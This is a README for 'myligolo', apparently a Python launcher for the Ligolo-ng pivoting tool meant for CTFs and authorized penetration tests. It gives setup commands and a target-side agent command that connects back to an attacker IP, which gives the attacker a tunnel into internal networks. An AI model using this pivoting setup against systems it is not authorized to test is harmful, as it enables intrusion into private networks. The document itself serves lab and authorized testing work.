# myligolo: Ligolo-ng pivoting launcher

**Ligolo-ng pivoting** launcher by [Hackita](https://en.hackita.it/articoli/ligolo-ng): it prepares the TUN interfaces and starts the `ligolo-proxy` listener in one command, then prints the exact commands you need on the attacker machine and on the target. Python standard library only.

Built for CTFs, Hack The Box labs and authorized penetration tests.

Full guide on Ligolo-ng, how the tunnel works, pivoting through multiple networks and detection:
**[Ligolo-ng: guide to pivoting with a TUN interface](https://en.hackita.it/articoli/ligolo-ng)**
(also in [Italian](https://hackita.it/articoli/ligolo-ng)).

## What it does

- Creates up to 10 TUN interfaces: `ligolo`, `ligolo2`, `ligolo3`, ... `ligolo10` (skips the ones that already exist)
- Starts `ligolo-proxy -selfcert -laddr 0.0.0.0:<port>` (default port `11601`)
- Prints the proxy console commands (`session`, `start`) and the `ip route` commands for the internal network and the Magic IP (`240.0.0.1`)
- Prints the agent command for the target machine
- Checks that `ligolo-proxy` is in your `PATH` and tells you where to download it if not

## Requirements

- Linux with `iproute2` (`ip`) and `sudo`
- Python 3
- The Ligolo-ng proxy binary available as `ligolo-proxy` in your `PATH` ([releases](https://github.com/nicocha30/ligolo-ng/releases))
- The Ligolo-ng agent binary for the target

## Usage

```bash
sudo python3 myligolo.py
sudo python3 myligolo.py 4444
```

The optional argument is the port the proxy listens on (default `11601`). The interfaces are created for `root`, so run the script with `sudo`.

Then, in the proxy console:

```text
session
start
```

On your machine, in another terminal, add a route to the internal network through the interface:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 240.0.0.1/32 dev ligolo
```

The second route is the Magic IP: it lets you reach the `localhost` of the machine running the agent.

On the target:

```bash
./agent -connect 10.10.14.5:11601 --ignore-cert
```

For a second session on a second network, use `ligolo2`:

```text
tunnel_start --tun ligolo2
```

```bash
sudo ip route add 192.168.1.0/24 dev ligolo2
```

## Disclaimer

For educational use and authorized environments only (labs, CTFs, systems you own or have written permission to test). The author is not responsible for misuse.

## More from Hackita

Offensive security and ethical hacking: [hackita.it](https://hackita.it/articoli/ligolo-ng)
